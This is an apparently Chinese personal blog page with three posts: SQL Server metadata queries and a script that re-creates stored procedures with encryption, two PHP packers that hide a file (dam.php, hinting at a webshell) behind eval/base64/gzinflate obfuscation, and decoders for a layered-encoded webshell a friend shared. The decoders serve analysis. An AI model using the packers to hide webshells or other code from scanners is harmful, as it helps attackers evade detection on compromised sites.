style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INFORMATION_SCHEMA .VIEWS</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;width:179.3pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;" width="239"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前数据库中的当前用户可以访问的视图及其所有者、定义等信息。</span></span><br><br></td><br></tr><br></tbody><br></table><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">由于这些信息架构都是以视图的方式存在的，因此我们可以很方便地获得并利用需要的信息。</span></span><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">例如，我们要得到某个表有多少列，可以使用以下语句：</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">SELECT COUNT(&amp;#42) FROM INFORMATION_SCHEMA.COLUMNS </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">WHERE TABLE_NAME=’mytable’</span></span><br><br>&nbsp;<br><br>&nbsp;<br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">—-</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">应用</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">———————————————————————-</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–1</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">：获取当前数据库中的所有用户表</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">select Name from sysobjects where xtype=’u’ and status&gt;=0</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–2</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">：获取某一个表的所有字段</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">select name from syscolumns where id=object_id(N’</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">表名</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">’)</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–3</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">：查看与某一个表相关的视图、存储过程、函数</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">select a.&amp;#42 from sysobjects a, syscomments b where a.id = b.id and b.text like N’%</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">表名</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">%’</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–4</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">：查看当前数据库中所有存储过程</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">select name as </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">存储过程名称</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> from sysobjects where xtype=’P’</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–5</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">：查询用户创建的所有数据库</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">select &amp;#42 from master..sysdatabases D where sid not in(select sid from master..syslogins where name=’sa’)</span></span><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">或者</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">select dbid, name AS DB_NAME from master..sysdatabases where sid &lt;&gt; 0x01</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–6</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">：查询某一个表的字段和数据类型</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">select column_name,data_type from information_schema.columns</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">where table_name = N’</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">表名</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">’ </span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–7:</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">获取数据库文件路径</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">select ltrim(rtrim(filename)) from </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">数据库名</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">..sysfiles where charindex(’MDF’,filename)&gt;0</span></span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">or</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">select ltrim(rtrim(filename)) from </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">数据库名</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">..sysfiles where charindex(’LDF’,filename)&gt;0</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–8:</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">获取某一个表的基本信息</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">sp_MShelpcolumns N’</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">表名</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">’</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–9:</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">获取某一个表的主键、外键信息</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">exec sp_pkeys N’</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">表名</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">’</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">exec sp_fkeys&nbsp; N’</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">表名</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">’</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–10:</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">判断某一个表是否存在某一列</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">(</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">字段</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">)</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">if exists(select 1 from syscolumns where id=object_id(N’</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">表名</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">) and name=N’</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">字段</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">’)</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">&nbsp;&nbsp;&nbsp; print&nbsp; N’</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">存在</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">’</span></span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">else</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">&nbsp;&nbsp;&nbsp; print&nbsp; N’</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">不存在</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">’</span></span></span><br><br>&nbsp;<br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">下面给出了一个存储过程，它的作用是自动将当前数据库的用户存储过程加密。</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">DECLARE @sp_name nvarchar(400)</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">DECLARE @sp_content nvarchar(2000)</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">DECLARE @asbegin int</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">declare @now datetime</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">select @now = getdate()</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">DECLARE sp_cursor CURSOR FOR </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">SELECT object_name(id)</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">FROM sysobjects</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">WHERE xtype = ’P’ </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">AND type = ’P’ </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">AND crdate &lt; @now</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">AND OBJECTPROPERTY(id, ’IsMSShipped’)=0</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">OPEN sp_cursor</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">FETCH NEXT FROM sp_cursor </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INTO @sp_name</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">WHILE @@FETCH_STATUS = 0</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">BEGIN</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">SELECT @sp_content = text FROM syscomments WHERE id = OBJECT_ID(@sp_name) </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">SELECT @asbegin = PATINDEX ( ’%AS’ + char(13) + ’%’, @sp_content) </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">SELECT @sp_content = SUBSTRING(@sp_content, 1, @asbegin - 1) </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">+ ’ WITH ENCRYPTION AS’</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">+ SUBSTRING (@sp_content, @asbegin+2, LEN(@sp_content))</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">SELECT @sp_name = ’DROP PROCEDURE [’ + @sp_name + ’]’</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">EXEC sp_executesql @sp_name </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">EXEC sp_executesql @sp_content</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">FETCH NEXT FROM sp_cursor </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INTO @sp_name</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">END</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">CLOSE sp_cursor </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">DEALLOCATE sp_cursor</span></span><br><br><span style="font-size:small;"><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">该存储过程利用了</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> sysobjects </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">和</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> syscomments </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">表，并巧妙地修改了原存储过程的</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> SQL </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">定义语句，将</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> AS </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">修改为了</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> WITH ENCRYPTION AS</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">，从而达到了加密存储过程的目的。本存储过程在</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> SQL Server 2000 </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">上通过。</span></span><br><br></div><br></div>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2011/10/07/两种php源码加密代码/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2011/10/07/两种php源码加密代码/" itemprop="url">两种php源码加密代码</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2011-10-07T12:25:40+08:00">
                2011-10-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP-MYSQL学习/" itemprop="url" rel="index">
                    <span itemprop="name">PHP|MYSQL学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>第一种：</p>
<pre class="brush:php; toolbar: true; auto-links: true;">&lt;?php 
function encode_file_contents($filename) { 
$type=strtolower(substr(strrchr($filename,’.’),1)); 
if(’php’==$type &amp;&amp; is_file($filename) &amp;&amp; is_writable($filename)){// 如果是PHP文件 并且可写 则进行压缩编码 
$contents = file_get_contents($filename);// 判断文件是否已经被编码处理 
$contents = php_strip_whitespace($filename); 
// 去除PHP头部和尾部标识 
$headerPos = strpos($contents,’&lt;?php’); 
$footerPos = strrpos($contents,’?&gt;’); 
$contents = substr($contents,$headerPos+5,$footerPos-$headerPos); 
$encode = base64_encode(gzdeflate($contents));// 开始编码 
$encode = ’&lt;?php’."
 eval(gzinflate(base64_decode("."’".$encode."’".")));

?&gt;"; 
return file_put_contents($filename,$encode); 

} 
return false; 
} 
//调用函数 
$filename=’dam.php’; 
encode_file_contents($filename); 
echo "OK,加密完成！" 
?&gt;</pre> 

<p>&nbsp;</p>
<p>第二种：</p>
<pre class="brush:php; toolbar: true; auto-links: true;">&lt;?php 
function RandAbc($length=""){//返回随机字符串
  $str="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  return str_shuffle($str);
}
$filename=’dam.php’;
$T_k1=RandAbc();//随机密匙1
$T_k2=RandAbc();//随机密匙2
$vstr=file_get_contents($filename);//要加密的文件
$v1=base64_encode($vstr);
$c=strtr($v1,$T_k1,$T_k2);//根据密匙替换对应字符。
$c=$T_k1.$T_k2.$c;
$q1="O00O0O";
$q2="O0O000";
$q3="O0OO00";
$q4="OO0O00";
$q5="OO0000";
$q6="O00OO0";
$s=’$’.$q6.’=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$’.$q1.’=$’.$q6.’{3}.$’.$q6.’{6}.$’.$q6.’{33}.$’.$q6.’{30};$’.$q3.’=$’.$q6.’{33}.$’.$q6.’{10}.$’.$q6.’{24}.$’.$q6.’{10}.$’.$q6.’{24};$’.$q4.’=$’.$q3.’{0}.$’.$q6.’{18}.$’.$q6.’{3}.$’.$q3.’{0}.$’.$q3.’{1}.$’.$q6.’{24};$’.$q5.’=$’.$q6.’{7}.$’.$q6.’{13};$’.$q1.’.=$’.$q6.’{22}.$’.$q6.’{36}.$’.$q6.’{29}.$’.$q6.’{26}.$’.$q6.’{30}.$’.$q6.’{32}.$’.$q6.’{35}.$’.$q6.’{26}.$’.$q6.’{30};eval($’.$q1.’("’.base64_encode(’$’.$q2.’="’.$c.’";eval(’?&gt;’.$’.$q1.’($’.$q3.’($’.$q4.’($’.$q2.’,$’.$q5.’&#422),$’.$q4.’($’.$q2.’,$’.$q5.’,$’.$q5.’),$’.$q4.’($’.$q2.’,0,$’.$q5.’))));’).’"));’;
$s=’&lt;?php
’.$s.
’
 ?&gt;’;
echo "OK,加密完成！";
//生成 加密后的PHP文件
$fpp1 = fopen(’dam.php’,’w’);
fwrite($fpp1,$s) or die(’写文件错误’); 
?&gt; </pre> 

<p>&nbsp;</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2011/10/05/解密一个php大马/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2011/10/05/解密一个php大马/" itemprop="url">解密一个php大马</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2011-10-05T00:41:47+08:00">
                2011-10-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP-MYSQL学习/" itemprop="url" rel="index">
                    <span itemprop="name">PHP|MYSQL学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 群里朋友发来一个php大马好像是国外的！被一个人汉化了，但是同时也被他加密了！其实他用的加密方法很简单！</p>
<p>就是base64+gzinflate压缩编码（加密），一般就是用&lt;?PHP eval(gzinflate(base64_decode(密文)));?&gt;方式书写;其实这个想看见他的源码很好办直接吧eval改echo就好了，但是今天遇到一个重复压缩加密的我也不知道他加了多少次，于是乎我到百度解密代码如下：</p>
<p>&lt;?php </p>
<p>$Code = ’这里填写要解密的编码’; // base64编码 </p>
<p>$File = ’test.php’;//解码后保存的文件 </p>
<p>$Temp = base64_decode($Code); </p>
<p>$temp = gzinflate($Temp); </p>
<p>$FP = fopen($File,”w”);</p>
<p>&nbsp;fwrite($FP,$temp);</p>
<p>&nbsp;fclose($FP); </p>
<p>echo “解密成功！”;</p>
<p>?&gt;</p>
<p>&nbsp;</p>
<p>改的重复解密代码：</p>
<p>&lt;?php&nbsp; </p>
<p>$b = ’密文’; //base64密文</p>
<p>$c = ’decoded.php’; </p>
<p>for($i=0;$i&lt;1;$i–)</p>
<p>{</p>
<p>$b=base64_decode($b);&nbsp; </p>
<p>$b=trim(gzinflate($b));</p>
<p>$b=trim(str_replace(“?&gt;&lt;?php”,””,$b));</p>
<p>$b=trim(str_replace(“?&gt;&lt;?”,””,$b));</p>
<p>$b=trim(str_replace(“eval(gzinflate(base64_decode(’”,””,$b));</p>
<p>$b=trim(str_replace(“’)));”,””,$b));</p>
<p>$d=substr($b,0,1);</p>
<p>if(0==strcmp($d,””))</p>
<p>{</p>
<p>&nbsp;break;</p>
<p>}</p>
<p>file_put_contents($c,”&lt;?php”.”<br>“.$b.”?&gt;”);</p>
<p>}&nbsp;&nbsp;&nbsp; </p>
<p>echo “解密成功！”;&nbsp; </p>
<p>?&gt;</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/13/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span><a class="page-number" href="/page/15/">15</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/15/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">John Doe</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">165</span>
                  <span class="site-state-item-name">Artikel</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                
                  <span class="site-state-item-count">13</span>
                  <span class="site-state-item-name">Kategorien</span>
                
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">182</span>
                  <span class="site-state-item-name">Tags</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2011 &mdash; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
